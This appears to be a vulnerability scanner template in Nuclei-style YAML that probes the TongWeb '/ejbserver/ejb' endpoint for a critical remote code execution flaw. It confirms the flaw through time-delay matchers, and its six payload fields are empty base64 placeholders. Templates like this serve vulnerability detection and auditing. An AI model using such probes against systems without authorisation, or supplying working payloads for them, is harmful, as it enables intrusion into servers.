id: tongweb-ejb-rce
info:
  name: 东方通 TongWeb - 远程代码执行漏洞
  author: Chaitin
  severity: critical
  metadata:
    verified: true
    max-request: 7
    vendor: tongweb
    product: tongweb
  tags: rce,vuln,tongweb
variables:
  decoded_data1: '{{base64_decode("")}}'
  decoded_data2: '{{base64_decode("")}}'
  decoded_data3: '{{base64_decode("")}}'
  decoded_data4: '{{base64_decode("")}}'
  decoded_data5: '{{base64_decode("")}}'
  decoded_data6: '{{base64_decode("")}}'
flow: http(1) && ( http(2) && http(3) || http(4) && http(5) || http(6) && http(7) )
http:
  - method: POST
    path:
      - '{{BaseURL}}/ejbserver/ejb'
    redirects: false
    headers:
      Content-Type: '*'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
  - max-redirects: 0
    method: POST
    path:
      - '{{BaseURL}}/ejbserver/ejb'
    redirects: false
    headers:
      Content-Type: '*'
    body: '{{decoded_data1}}'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "com.tongweb.tongejb") && duration * 1000 - r0latency >= 7 * 1000 - 1000'
  - max-redirects: 0
    method: POST
    path:
      - '{{BaseURL}}/ejbserver/ejb'
    redirects: false
    headers:
      Content-Type: '*'
    body: '{{decoded_data2}}'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "com.tongweb.tongejb") && duration * 1000 - r0latency >= 3 * 1000 - 1000'
  - max-redirects: 0
    method: POST
    path:
      - '{{BaseURL}}/ejbserver/ejb'
    redirects: false
    headers:
      Content-Type: '*'
    body: '{{decoded_data3}}'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && len(body) == 0 && duration * 1000 - r0latency >= 7 * 1000 - 1000'
  - max-redirects: 0
    method: POST
    path:
      - '{{BaseURL}}/ejbserver/ejb'
    redirects: false
    headers:
      Content-Type: '*'
    body: '{{decoded_data4}}'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && len(body) == 0 && duration * 1000 - r0latency >= 3 * 1000 - 1000'
  - max-redirects: 0
    method: POST
    path:
      - '{{BaseURL}}/ejbserver/ejb'
    redirects: false
    headers:
      Content-Type: '*'
    body: '{{decoded_data5}}'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && len(body) == 0 && duration * 1000 - r0latency >= 7 * 1000 - 1000'
  - max-redirects: 0
    method: POST
    path:
      - '{{BaseURL}}/ejbserver/ejb'
    redirects: false
    headers:
      Content-Type: '*'
    body: '{{decoded_data6}}'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && len(body) == 0 && duration * 1000 - r0latency >= 3 * 1000 - 1000'
